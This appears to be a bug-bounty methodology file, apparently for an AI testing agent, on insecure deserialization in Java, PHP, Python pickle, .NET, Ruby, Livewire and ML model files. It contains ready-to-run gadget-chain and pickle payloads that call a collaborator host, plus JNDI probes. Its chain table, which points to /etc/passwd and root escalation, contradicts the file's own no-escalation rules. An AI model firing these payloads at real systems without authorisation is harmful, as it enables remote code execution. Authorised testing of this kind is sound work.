---
name: hunt-deserialization
description: "Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. RCE via deserialization is almost always Critical. Also covers blind-sink confirmation without code execution (ysoserial URLDNS DNS-only oracle, GadgetProbe classpath enumeration), SignedObject wrapping past per-stream look-ahead filters, Laravel Livewire snapshot hydration (CVE-2025-54068), Ruby class pollution and Rails _json juggling, and ML model files as deserialization sinks (PyTorch torch.load pickle, Keras .keras/.h5 config deserialization, joblib, numpy allow_pickle). Use when target runs Java, PHP serialization, Python pickle, .NET, Ruby on Rails or Livewire, or when it loads uploaded or fetched model/checkpoint files."
sources: hackerone_public, hacktricks_coverage_checklist, ysoserial_project, ysoserial_net_project, gadgetprobe_bishopfox, github_advisory_database, pytorch_docs, keras_docs, numpy_docs, joblib_docs, python_stdlib_docs, hdf_group_format_spec, openjdk_source, synacktiv_research, doyensec_research, trailofbits_fickling, protectai_modelscan
report_count: 22
---

# HUNT-DESERIALIZATION — Insecure Deserialization

## Crown Jewel Targets

Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.

**Highest-value chains:**
- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE

---

## Attack Surface Signals

### Detection Patterns
```bash
# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# PHP serialization: O:8:"stdClass":0:{}
# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02
# Python pickle, base64-wrapped: "gASV" = \x80\x04\x95 (proto 4), "gAWV" (proto 5), "gAJ" (proto 2)

# Model / checkpoint files are deserialization sinks too. First bytes:
#   HDF5 (.h5 / .hdf5 / Keras weights): 137 72 68 70 13 10 26 10 = 89 48 44 46 0d 0a 1a 0a = "\x89HDF\r\n\x1a\n"
#   PyTorch .pt/.pth since 1.6: uncompressed ZIP64, "PK\x03\x04", members data.pkl + data/0.. + version (+ byteorder since 2.1)
#   PyTorch legacy (pre-1.6, or _use_new_zipfile_serialization=False): bare pickle stream, \x80\x02 ...
#   Keras v3 .keras: ZIP containing config.json (architecture = the attack surface) + metadata.json + model.weights.h5
#   NumPy .npy: "\x93NUMPY" + 2 version bytes; .npz: ZIP of .npy members
#   joblib: a pickle stream, optionally zlib/gzip/bz2/lzma-compressed. No single documented magic -- identify by member/extension, not by signature.
unzip -l model.pt | grep -E 'data\.pkl|version'   # ZIP-format torch checkpoint confirmed
head -c8 model.h5 | xxd                            # HDF5 signature check

# Apache Shiro: rememberMe cookie present
curl -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

### Header / Cookie Signals
```
Content-Type: application/x-java-serialized-object
Cookie containing rO0= prefix (Java base64 serialized)
Cookie: rememberMe= (Apache Shiro)
Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
Endpoints: /livewire/update (Livewire 3 snapshot hydration), /livewire/livewire.js?id=<hash> (version fingerprint)
Endpoints: /predict, /load_model, /api/models/import, model-registry pull by URL or repo id
Upload fields accepting .pt .pth .bin .ckpt .pkl .joblib .h5 .hdf5 .keras .npy .npz, or a SavedModel directory
```

---

## Confirmation Ladder (Read Before Any Payload)

Deserialization RCE is the most destructive thing in this bundle. Climb in order and **stop at the first rung that proves the bug.** A confirmed deserialization sink is already a Critical finding on its own; you do not need command execution to report it, and reaching for RCE when a lower rung already proved the bug is a mistake, not thoroughness.

| Rung | Proof | Executes code? | Gate |
|---|---|---|---|
| 1 | Sink reached (DNS lookup, error differential, or static source evidence) | No | Stage A, in scope |
| 2 | Classpath / gadget-library fingerprint | No | Stage A, in scope |
| 3 | Benign in-band marker via a gadget chain | **Yes** | Stage B, written sign-off |
| 4 | Command output with a unique canary | **Yes** | Stage B, written sign-off |

**Rung 1 is format-specific. Do not fake an oracle that the format does not have.**

- **Java** has a true non-executing oracle: `ysoserial URLDNS`. Its argument is a URL, not a command; it builds a `HashMap` with a `URL` key whose cached hash is reset, so reconstruction calls `URL.hashCode()` and resolves DNS. It needs no third-party library, only JDK classes, and it runs no code.
- **PHP** rung 1 is the error differential already in Phase 2 (a well-formed vs. truncated `O:8:` string changing the response).
- **Pickle, .NET, Ruby** have **no non-executing gadget oracle.** There, rung 1 is static evidence: a reachable `pickle.loads` / `BinaryFormatter.Deserialize` / `Marshal.load` in leaked source, a magic-byte match in a parameter you control, or a framework version in a known-vulnerable range. Say "sink identified, execution not attempted" and stop.

**Rung 3/4 rules (every one of these is non-negotiable):**

- A gadget chain that runs `sleep`, `nslookup` or `curl` **is command execution.** It belongs in Stage B behind sign-off, not in a detection pass.
- Never use a deserialization bomb for timing (nested `HashSet`/`HashMap` graphs, billion-laughs-style object expansion). That is denial of service.
- Never write a payload that writes to disk, drops a file, opens an interactive or reverse shell, or persists anything. (`system()` and `os.system` route through `sh` by construction; that is fine. A shell you can type into is not.) Benign markers only: `id`, `echo <canary>`, a DNS callback, a single `whoami`.
- **Blind sink:** the canary is a DNS label at your collaborator, e.g. `${CANARY}.COLLAB_HOST`. Send a **control request** with a non-serialized value in the same parameter and confirm it produces **no** callback, before attributing the callback to deserialization.
- **In-band sink:** confirmed RCE requires the exact unique `$CANARY` echoed back **plus** command output absent from a saved Stage-A baseline body. A bare `uid=` with no canary echo is a WAF page or an error template, not a finding.

**Rate posture for gadget / class enumeration:** serial only, never parallel. One concurrent request, a fixed 1.5s delay between probes, and a hard cap of 300 candidate classes per endpoint per session. In Burp Intruder, bind the attack to a resource pool configured for a single concurrent request plus a fixed delay. Use a fresh collaborator hostname for each repeat so resolver caching cannot be mistaken for a hit or a miss.

**Where the phases below sit on this ladder.** Stage A: Phase 1b (URLDNS, GadgetProbe), Phase 1c, Phase 5's `${jndi:dns://...}` and bare `ldap://` collaborator probes, Phase 6b, and the static review in Phase 7. Serving an actual reference through JNDI-Exploit-Kit is Stage B. Run Phase 5's header loop **serially, without the trailing `&`**, at the same 1.5s delay.

Every phase that hands a command string to a gadget generator is rung 3 or 4 and therefore **Stage B, sign-off required**, however that phase labels it: Phase 1's `ysoserial ... 'curl ...'`, Phase 2's phpggc chain, Phase 3's `__reduce__` payload, Phase 3b, Phase 4's ysoserial.net `-c`.

**One payload below is out of bounds even with sign-off.** Phase 1's `'id > /tmp/pwned'` writes a file to the target's disk. Do not run it under any sign-off. Use the Phase 1b Stage B block instead, which proves the same thing with a DNS lookup and leaves nothing behind.

---

## Step-by-Step Hunting Methodology

### Phase 1 — Java Deserialization (ysoserial)
```bash
# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate OOB detection payload
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://COLLAB_HOST/ysoserial' | base64 -w0

# Send as body or cookie. The command is a DNS lookup, not a file write: a
# callback proves the gadget chain executed and leaves nothing on the target.
# Never substitute a payload that redirects to disk (see the ladder above).
java -jar ysoserial-all.jar CommonsCollections6 \
  'nslookup cc6-$(hostname).COLLAB_HOST' | base64 -w0 | \
  curl -s https://$TARGET/wls-wsat/CoordinatorPortType \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @-

# Apache Shiro exploit (default AES key)
python3 shiro_exploit.py -u https://$TARGET/ -c "id"
```

### Phase 1b — Blind Java: URLDNS oracle, then GadgetProbe classpath enumeration

This is the whole point of the ladder. It turns a guess into a confirmed finding with zero code execution.

```bash
# Stage A rung 1 -- URLDNS. Runs NO code. The argument is a URL, not a command.
CANARY="dz$(head -c6 /dev/urandom | od -An -tx1 | tr -d ' \n')"
java -jar ysoserial-all.jar URLDNS "http://${CANARY}.COLLAB_HOST/" > /tmp/urldns.bin
base64 -w0 /tmp/urldns.bin                       # wrap to match the parameter's own encoding
curl -s "https://$TARGET/<endpoint>" > /tmp/deser_baseline.txt   # Stage-A baseline body, keep it

# Control request -- SAME parameter, a plain non-serialized value that carries a FRESH canary
# hostname in clear text (not serialized, not base64). It must produce NO callback.
# If it does call back, something in front of the app -- a WAF, a log pipeline, a scanner -- is
# decoding request data and resolving hostnames it finds. The oracle is void; say so and stop.
curl -s "https://$TARGET/<endpoint>" --data-urlencode "param=http://${CANARY}ctl.COLLAB_HOST/"
```

A DNS lookup for `$CANARY` means: your bytes reached `ObjectInputStream.readObject` on a JVM with DNS egress. That is a confirmed deserialization sink. **Report it. You are done unless RCE is explicitly in scope.** No callback is ambiguous, not negative: egress filtering, a JEP 290 `ObjectInputFilter`, resolver caching or a framing mismatch all suppress it.

**GadgetProbe (rung 2, still no code execution).** It answers one question: which class names can the remote JVM resolve? Mechanically it builds an ordered map holding a synthetic `Class` object for the candidate name, followed by a `URL` key. Because entries are rebuilt in the order they were inserted, the candidate's type descriptor has to resolve before the `URL` is ever hashed. If it does not resolve, the stream dies early and nothing calls back. If it does, the lookup fires with the class name embedded in the hostname. So what you measure is **loadability of a name**, nothing more. Not that the class is `Serializable`. Not that it belongs to a chain that works.

Install from the Burp BApp Store (Extender). No `java -jar` CLI is documented, so do not invent flags. Burp workflow:

1. Send the request to Intruder, highlight the complete serialized value.
2. Payload list = class names (the project ships wordlists under `wordlists/`).
3. Add the GadgetProbe payload processor **before** any transport processor (Base64, URL-encode). Order matters.
4. Run three controls before anything else. A plain URLDNS first, to prove the insertion point and the decoding layers work at all. Then `java.lang.String`, which every JVM must resolve, as the positive control. Then a randomised package and class name that cannot exist anywhere, as the negative control.
5. Enumerate third-party candidates only once the positive fires and the negative stays silent. Hits land in the GadgetProbe tab.

Outside HTTP there is no Intruder to lean on, so drive the library directly and do the protocol framing yourself:

```java
// Constructor argument is your authoritative nameserver, or a Collaborator subdomain.
GadgetProbe gp = new GadgetProbe("COLLAB_HOST");
Object candidate = gp.getObject("org.apache.commons.collections.functors.InvokerTransformer");
ByteArrayOutputStream buf = new ByteArrayOutputStream();
new ObjectOutputStream(buf).writeObject(candidate);
byte[] bytes = buf.toByteArray();   // wrap in whatever framing the protocol expects
```

A set of hits is a classpath fingerprint, not a verdict. Shaded or relocated JARs, minimised builds and application-specific class loaders all skew it, and whether a chain actually fires depends on the JDK build **and** the precise combination of dependency versions. One class hit is not evidence that an RCE chain works.

```bash
# Stage B -- ONLY with explicit written RCE-attempt sign-off. This EXECUTES A COMMAND on the target.
# Blast radius, state it in the sign-off request: one nslookup process as the JVM's user, exits immediately.
# Nothing written to disk, no application state changed, no service restarted, no persistence.
# Pick the chain from the GadgetProbe hits, not from a guess. CommonsCollections6 needs commons-collections:3.1.
java -jar ysoserial-all.jar CommonsCollections6 "nslookup ${CANARY}b.COLLAB_HOST" > /tmp/cc6.bin
# Send /tmp/cc6.bin through the same insertion point and encoding the URLDNS probe validated.

# Control for this rung: send the SAME bytes to a parameter or endpoint that does NOT deserialize
# (a plain search field, a static path). It must produce no interaction.
# A hit there means middleware is decoding request bodies and resolving hostnames, not that the
# gadget ran. The oracle is void; do not claim RCE.
```

A DNS interaction for `${CANARY}b` and not for the control means the chain reached `Runtime.exec`. That is confirmed RCE; **stop and report.** If the sink is in-band instead, the claim needs the exact `$CANARY` echoed back plus `uid=` output absent from `/tmp/deser_baseline.txt` -- a body diff, as `vmware-vcenter-attack` Step 4 does it. Do not escalate further: no second command, no file write, no reverse shell.

### Phase 1c — SignedObject wrapping vs look-ahead deserialization filters

`java.security.SignedObject` is the standard way past a **per-stream** allowlist. A hardened sink often constrains the outermost type with a look-ahead stream (`ValidatingObjectInputStream` from Commons IO, a `resolveClass` override, or a per-stream `ObjectInputFilter`) that permits only `SignedObject` and `byte[]`. That check passes, because `SignedObject` is genuinely the outer type. The gadget graph lives *inside*.

The bypass is in the JDK source: `SignedObject.getObject()` wraps its stored `content` byte array in a `ByteArrayInputStream` and constructs a plain `new ObjectInputStream(b)`. It installs **no** filter on that inner stream. So:

- A **per-stream** look-ahead filter on the outer stream does not cover the inner graph. Wrapping defeats it.
- A **process-wide** filter still applies. The `ObjectInputStream` javadoc is explicit: the constructor "initializes the deserialization filter to the filter returned by invoking the serial filter factory returned from `ObjectInputFilter.Config.getSerialFilterFactory()` with `null` for the current filter and the static JVM-wide filter for the requested filter." So a `jdk.serialFilter` (JEP 290) or a JEP 415 filter factory covers the inner stream too. Work out which the target actually has before you call this a bypass.

```bash
# Detection only -- source review. No payload is sent by any line here.
grep -rnE 'SignedObject|ValidatingObjectInputStream|setObjectInputFilter|resolveClass' --include='*.java' .
# The bug signature: getObject() called with no verify() before it, or verify() skipped on some mode branch.
```

What gates exploitation is the **signature**, not the filter. `getObject()` deserializes regardless of verification, but production code normally calls `verify(pubKey, sigEngine)` first and bails out. Without one of the following you cannot execute, and you should say so plainly in the report rather than claiming RCE:

- the private key matching the public key the product has baked in, or
- a service that will sign bytes you supply (a signing oracle), or
- a branch that arrives at `getObject()` with `verify()` skipped or short-circuited.

Absent all three, the honest finding is **"unauthenticated deserialization sink reachable, gated by signature verification"** plus the reachability proof. CVE-2025-10035 (GHSA-fcfw-g3g2-2588, critical; GoAnywhere MFT License Servlet, fixed in **7.8.4** and Sustain Release **7.6.3**; added to the CISA KEV catalog 2025-09-29) is the canonical shape. The CVE text itself says exploitation needs "a validly forged license response signature", and the pre-auth reach came from elsewhere: an error-handling flow issued a session-bound license token to a session that had never authenticated. The transferable lesson has nothing to do with the product. **An error page that performs privileged work on its way out, and leaves session state behind when it does, is an entry point of its own.** Test them.

### Phase 2 — PHP Object Injection
```bash
# Find unserialize() calls in source
grep -r "unserialize(" --include="*.php" .

# Inject test: O:8:"stdClass":1:{s:4:"test";s:5:"value";}
# Send in cookie, POST param, or hidden form field
# If error changes → deserialization confirmed

# Craft gadget chain using phpggc
git clone https://github.com/ambionics/phpggc
php phpggc -l  # list chains
php phpggc Laravel/RCE5 system id | base64
```

### Phase 2b — Laravel Livewire snapshot hydration

Livewire is PHP object injection without `unserialize()`. `hunt-laravel` owns `APP_KEY` discovery (its Phase 4) and classic encrypted-cookie forging (its Phase 7); the hydration mechanics live here.

A Livewire 3 component carries its state across requests as a JSON **snapshot** (`data`, `memo`, `checksum`) POSTed to `/livewire/update`; the server rebuilds the component from it and then runs whatever sits in `calls` and `updates`. Anything that is not a scalar travels as a two-element **synthetic tuple**, `[value, {"s":"<synth-key>", ...meta}]`. The hydrator looks at `meta.s`, hands the tuple to that synthesizer, and recurses into the children. The consequence is the bug class: whoever controls the tuple metadata controls which class gets constructed, and can nest tuples to assemble an object graph, without a single byte of PHP serialization format being involved.

Three synthesizers hand you a construction primitive:

- **`clctn`** builds `new $meta['class']($value)` once the children are rehydrated, so any class whose constructor takes an array is reachable.
- **`form`** builds `new $meta['class']($component, $path)` and then copies each public property straight out of the children you supplied. Two loosely typed or defaulted constructor parameters are enough.
- **`mdl`** with no `key` in its meta falls through to a bare `new $class`, on a class name you chose.

Two distinct paths, with different prerequisites:

```bash
# Stage A -- fingerprint only. No payload.
curl -s "https://$TARGET/" | grep -oE '/livewire/livewire\.js\?(id|v)=[0-9a-f]+'
curl -s -o /dev/null -w "%{http_code}\n" -X POST "https://$TARGET/livewire/update"
# Read the STATUS CODE only. 404 -> no Livewire route. Anything else -> the route exists.
# Expect 419 here: Laravel's CSRF middleware fires before Livewire sees the body. That is still a live route.
```

- **CVE-2025-54068** (GHSA-29cq-5w36-x7w3, CVSS v4 9.2 / v3.1 9.8, critical, CWE-94). Livewire v3 `>= 3.0.0-beta.1, < 3.6.4`; patched **3.6.4**; no workaround published; v3 only. The forged request keeps the original, genuinely valid checksum and rides the `updates` on top of the snapshot that checksum covers, which is why the researchers describe the technique as bypassing checksum validation rather than defeating it. The defect is in `hydrateForUpdate`: `getMetaForPath($raw, $path)` finds the stored value is a synthetic tuple, so Livewire hydrates your new value using **that existing meta** instead of deriving metadata for what you just sent. Hydration recurses, so a synthesizer nested inside an array gets re-examined at every child and can be smuggled in that way. **No `APP_KEY` needed.** The patch pins nested updates back to the untouched snapshot and refuses to let a child redefine its own `s` or `class` partway through hydration. Added to the CISA KEV catalog 2026-03-20, so expect it patched wherever anyone is paying attention and present wherever nobody is.
- **With `APP_KEY` known** (from `.env` exposure, see `hunt-laravel`), the snapshot checksum is `hash_hmac('sha256', json_encode($snapshot_without_checksum), $hashKey)` with `$hashKey` derived from `APP_KEY`. Anyone holding the key forges arbitrary snapshots on any Livewire version. **Rotating `APP_KEY` is part of remediation**, not optional, because the key alone restores the capability on a fully patched build.

Stage B tooling. **Sign-off required: both of these call PHP `system()` on the target.** Blast radius to state in the request: one short-lived process as the web-server user, no file written, no component state persisted, no queue job enqueued.

```bash
# Livepyre -- fingerprints the version, collects a baseline snapshot, builds either payload.
# -c/--check is the only non-destructive mode. Run it FIRST and stop if it answers the question.
python3 Livepyre.py -u "https://$TARGET/<component-path>" -c

CANARY="LW$(head -c6 /dev/urandom | od -An -tx1 | tr -d ' \n')"
python3 Livepyre.py -u "https://$TARGET/<component-path>" -f system -p "echo ${CANARY}; id"
python3 Livepyre.py -u "https://$TARGET/<component-path>" -a 'base64:<APP-KEY>' -f system -p "echo ${CANARY}; id"
# -F forces past the version gate. Do not use it: it converts a clean negative into a blind attempt.
# -H adds headers, -P a proxy, -d debug output.

# laravel-crypto-killer, livewire mode (signed-snapshot path; README documents the exploit subcommand
# only by example, so treat the flag set as example-confirmed rather than fully documented)
./laravel_crypto_killer.py exploit -e livewire -k 'base64:<APP-KEY>' \
  -j request.json --function system -p "echo ${CANARY}; id"
```

Confirmed RCE means the exact `$CANARY` comes back in the response **and** `uid=` output that is absent from a Stage-A baseline body you saved before sending anything. `echo <canary>; id` is the ceiling for a PoC. Never a reverse or interactive shell, never a file write, and never the `curl <host>/shell.sh | sh` pattern that write-ups of this bug use as their illustration.

### Phase 3 — Python Pickle
```bash
# Generate OOB payload
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"

# Send as cookie or POST body
curl -s https://$TARGET/api/load-model \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl
```

### Phase 3b — PHP phar://, Python YAML, Node deserialization
- **PHP phar:// (no `unserialize()` call)** — any filesystem function (`file_exists`/`fopen`/`getimagesize`) on a `phar://` path deserializes the archive metadata -> object injection with zero `unserialize()` in code.
  ```bash
  phpggc -p phar -o poly.jpg Monolog/RCE1 system id   # valid-image + phar polyglot
  # then reach  phar://uploads/poly.jpg/x  via any fs call
  ```
- **Python `yaml.load()` (CVE-2017-18342)** — pre-5.1 default-unsafe:
  `!!python/object/apply:os.system ['curl http://$COLLAB/yaml']`
- **Node `node-serialize` (CVE-2017-5941)** — IIFE marker in any field passed to `unserialize()`:
  `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://$COLLAB/node')}()"}`

### Phase 4 — .NET ViewState
```bash
# Check if ViewState is unsigned (MAC disabled)
# Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC

# YSoSerial.Net
dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64
```

### Phase 5 — Log4Shell / JNDI
```bash
# Test all user-controlled inputs
COLLAB="COLLAB_HOST"
for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
  curl -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
done

# Test POST body fields
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
```

### Phase 6 — Ruby Marshal
```bash
# Look for Marshal.load in source
grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .

# Gem::Requirement gadget chain via marshalable objects
# Use ruby-advisory-db gadgets
```

### Phase 6b — Ruby beyond Marshal: YAML defaults, class pollution, `_json` juggling

```bash
# Detection only -- source review. Nothing is sent to the target by these greps.
# 1. YAML sink. Upstream psych commit 176494297f ("Use Psych.safe_load by default") flipped the default
#    and left Psych.unsafe_load as the opt-in for trusted data. Those calls, and any older YAML.load,
#    are the sink. The exact psych/Ruby release that shipped it is NOT confirmed here -- check the
#    installed version rather than assuming a boundary.
grep -rnE 'YAML\.(unsafe_)?load|Psych\.(unsafe_)?load|from_yaml' --include='*.rb' .

# 2. Recursive merge reaching attacker-controlled KEYS (class pollution). Keys, not values, is the test.
grep -rnE 'deep_merge!?|recursive_merge|Hashie|Mash|OpenStruct' --include='*.rb' .
grep -rnE 'instance_variable_set|attr_accessor +[a-z_]*key|class_eval|instance_eval' --include='*.rb' .
grep -rnE 'send\(.*key|public_send\(.*key|respond_to\?\(.*key' --include='*.rb' .
```

**Two Rails advisories worth version-checking before you hunt by hand**, both CVSS v3.1 9.8 critical:

- **CVE-2022-32224** (GHSA-3hhc-qp5v-9p2j), "Active Record RCE bug with Serialized Columns". `activerecord <= 5.2.8` (patched 5.2.8.1), `>= 6.0.0 <= 6.0.5` (6.0.5.1), `>= 6.1.0 <= 6.1.6` (6.1.6.1), `>= 7.0.0 <= 7.0.3` (7.0.3.1). A YAML-serialized column is a deserialization sink whose contents often come from user input.
- **CVE-2020-8165** (GHSA-2p68-f74v-9wc6), unintended unmarshalling of user-provided objects in ActiveSupport's `MemCacheStore` and `RedisCacheStore`. `activesupport >= 5.0.0 <= 5.2.4.2` (patched 5.2.4.3), `>= 6.0.0 <= 6.0.3` (6.0.3.1). The sink is the cache store, so look for user-controlled values written to the cache and read back.

**Class pollution gives you a write, not execution.** ActiveSupport's `Hash#deep_merge` merges hashes and stops there, so on its own it is harmless. The hole opens where the surrounding code loops over the merged result and promotes every key into state on the object, typically `self.class.attr_accessor key` followed by `instance_variable_set("@#{key}", value)`. Hashie's `deep_merge` goes further by writing object attributes directly; it refuses to replace methods, but exempts names ending in `_`, `!` or `?`, and the lone `_` attribute falls inside that exemption. Execution only arrives if something downstream feeds a polluted value to `instance_eval` or `eval`. Short of that, severity follows whatever the shadowed read governs: an outbound HTTP destination (hand it to `hunt-ssrf`), a signing or encryption key, an authorization role, a SQL fragment, a filesystem path, a serializer choice. And scope drives it too: a write confined to one instance is a smaller bug than one that climbs to the class or its parent and so reaches every instance.

**Rails `_json` juggling.** Post a JSON body whose root is not a hash, an array for instance, and Rails surfaces the parsed value under a synthetic `_json` parameter. Send an object that already carries a `_json` member and you get a parameter shape the validator and the eventual consumer may read differently:

```json
{"id": 7, "_json": [7, 4096]}
```

The vulnerability is that disagreement, not the parameter's existence. You have to show that the authorization check looked at one representation while a later operation acted on the other. Structurally this is nearer to mass assignment than to deserialization, so check `hunt-business-logic` and `hunt-api-misconfig` before you file it under this class.

### Phase 7 — Machine-learning model files as a deserialization sink

A model file is attacker-controlled data that the application deserializes. If an endpoint accepts an uploaded checkpoint, pulls a model by URL or repo id, or loads a user-selected model from object storage, that is a deserialization sink with a file-upload front door. See `hunt-llm-ai` and `hunt-rag-vector` for the AI-pipeline framing and `hunt-file-upload` for the upload path; the deserialization mechanics are here.

> **A model file handed to you is untrusted data. Loading it to "check" it IS the exploit.** `torch.load`, `joblib.load`, `keras.saving.load_model` and `numpy.load(allow_pickle=True)` all execute attacker code as a *documented* part of loading. Review it statically. If you must load one, do it in a disposable container with no network and no mounted host paths, never on the tester's machine, and never on a client host.

```bash
# Static review. None of these import the framework or execute pickle bytecode.
python3 -I -m zipfile -l suspect.pt                  # list members; expect data.pkl, data/0.., version
# Members usually sit under a top-level folder (<stem>/data.pkl or archive/data.pkl), so glob it.
# If the listing shows MORE than one .pkl, disassemble each separately: a crafted archive can carry a second one.
unzip -p suspect.pt '*data.pkl' > /tmp/model_pickle.bin
test -s /tmp/model_pickle.bin || echo "EXTRACTION FAILED -- fix the member path, do NOT fall back to loading the file"
python3 -I -m pickletools -a /tmp/model_pickle.bin | less
#   Python's own docs recommend `-m pickletools` over `-m pickle` for untrusted files
#   precisely because it does not execute pickle bytecode.
# Red flags in the disassembly: GLOBAL / STACK_GLOBAL resolving anything outside torch/numpy/collections
#   (posix, os, subprocess, builtins.eval, builtins.exec, runpy), then REDUCE applying it.

python3 -I -m zipfile -l suspect.keras               # config.json + metadata.json + model.weights.h5
unzip -p suspect.keras config.json | python3 -I -m json.tool | grep -nE '"module"|"class_name"|Lambda'
# Any "module" outside the keras/keras_nlp/keras_cv/keras_hub namespace, or a Lambda layer carrying
# marshalled bytecode, is the finding. config.json is the architecture and the attack surface.

head -c8 suspect.h5 | xxd                            # 89 48 44 46 0d 0a 1a 0a -> HDF5
head -c8 suspect.npy | xxd                           # \x93NUMPY + version bytes
```

Tool support, for the same static reading: `fickling --check-safety -p model.pkl` and `fickling --trace file.pkl` (traces the Pickle VM without exercising malicious code; `fickling[torch]` adds PyTorch and TorchScript format detection). `modelscan -p /path/to/model_file` reads the file byte-wise looking for unsafe code signatures and supports H5, pickle and SavedModel, plus joblib/cloudpickle/dill-based files and Keras v3. Neither tool loads the model.

**Version boundaries that decide whether a target is exposed:**

| Surface | Behaviour | Boundary |
|---|---|---|
| `torch.load` | Uses an unpickler; the docs say "Never load data from an untrusted source" | `weights_only=True` became the default in **PyTorch 2.6** when `pickle_module` is not passed. BC-breaking, deprecation started in 2.4. |
| `torch.load(weights_only=True)` | **CVE-2025-32434** (GHSA-53q9-r3pm-6pq6, CVSS 9.3 critical): RCE still reachable despite the "safe" setting | `torch < 2.6.0`; patched **2.6.0**. So `weights_only=True` on a pre-2.6 install is not a mitigation. |
| Keras `safe_mode` | "Whether to disallow unsafe `lambda` deserialization... applicable to the **Keras v3 model format**" only. Defaults to `True`. | The documented scope is the v3 `.keras` format. Legacy `.h5` and SavedModel loads fall outside it, which is exactly why the next row is a CVE rather than a documentation note. |
| Keras `.h5` load | **CVE-2025-9905** (GHSA-36rr-ww3j-vrjv, CVSS 8.7 high): `Model.load_model` *silently* ignores `safe_mode=True` for `.h5`/`.hdf5` | `keras >= 3.0.0, < 3.11.3`; patched **3.11.3**. |
| Keras crafted `config.json` | **CVE-2025-1550** (GHSA-48g7-3x6r-xfhp, CVSS 7.3 high): arbitrary module/function named in the config runs on load, even with `safe_mode=True` | `keras >= 3.0.0, < 3.9.0`; patched **3.9.0**. |
| Same, bypass of the above fix | **CVE-2025-8747** (GHSA-c9rc-mg46-23w3, high): CVE-2025-1550 bypass by reusing internal functionality | `keras >= 3.0.0, < 3.11.0`; patched **3.11.0**. |
| Keras Lambda layers | **CVE-2024-3660** (GHSA-x4wf-678h-2pmq, CVSS 9.3 critical): Lambda-layer code deserialized and executed unchecked | `keras < 2.13.1rc0`; patched **2.13.1rc0**. The `safe_mode` check does not apply to models stored in the older serialization formats. |
| `joblib.load` | Vendor docs: "relies on the pickle module and can therefore execute arbitrary Python code... should therefore never be used to load files from untrusted sources" | No safe mode exists. Any version. |
| `numpy.load` | `allow_pickle` defaults to **`False`**; object arrays fail to load without it | The vendor page does not state the version that changed the default, so treat the boundary as unverified and test the installed version instead of asserting one. The bug is application code that passes `allow_pickle=True`. |

Even on a current, patched Keras the surface is not zero: gadgets remain inside the allowlisted `keras`/`keras_nlp`/`keras_cv`/`keras_hub` namespaces, so enumerate allowlisted callables with file, network, process or environment side effects when assessing a hardened target.

**Reporting without executing.** A model-loading endpoint, plus a confirmed pickle sink, plus a version inside one of the ranges above, is a Critical finding at rung 1. Write that up and stop.

**Stage B for Phase 7 (explicit written sign-off required).** The marker is an outbound DNS lookup, from the **target**, to a unique canary embedded in the pickle's `__reduce__`. Never a file write, never a reverse shell. Name this blast radius in the sign-off request: **the file you upload may persist in the target's model storage and be loaded again later by other workers or other users**, so it is not a one-shot payload. Upload to a dedicated test namespace or bucket prefix, record the exact object path, and confirm deletion afterwards. Never publish one to a shared model registry other tenants pull from. (The disposable-container rule above is separate: it covers a file *you* load for your own analysis, and that container needs no network at all.)

---

## Chain Table

| Deserialization signal | Chain to | Impact |
|-----------------------|----------|--------|
| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |
| URLDNS callback | Stop. Report the sink | Critical on its own, no code executed |
| GadgetProbe class hits | Pick candidate chains for a signed-off Stage B | Narrows RCE attempt from guess to targeted |
| SignedObject sink, signature holds | Report reachability + the pre-auth path | Critical sink; say RCE was not achieved |
| Livewire hydration | phpggc-style gadget via synth instantiation | RCE as the web user |
| `.env` APP_KEY leak | Forge any Livewire snapshot (see `hunt-laravel`) | RCE survives the code patch until the key rotates |
| Model-file sink + vulnerable version | Static pickle/config review | Critical without loading the file |
| Ruby class pollution | Trace the shadowed read (SSRF, SQL, authz, signing key) | Depends on the gadget, not automatic RCE |

---

## Automation
```bash
# OOB listener
interactsh-client -v -n 5

# JNDI exploit kit
git clone https://github.com/pimps/JNDI-Exploit-Kit

# Blind Java oracle + classpath enumeration (no code execution)
java -jar ysoserial-all.jar URLDNS "http://$CANARY.COLLAB_HOST/"
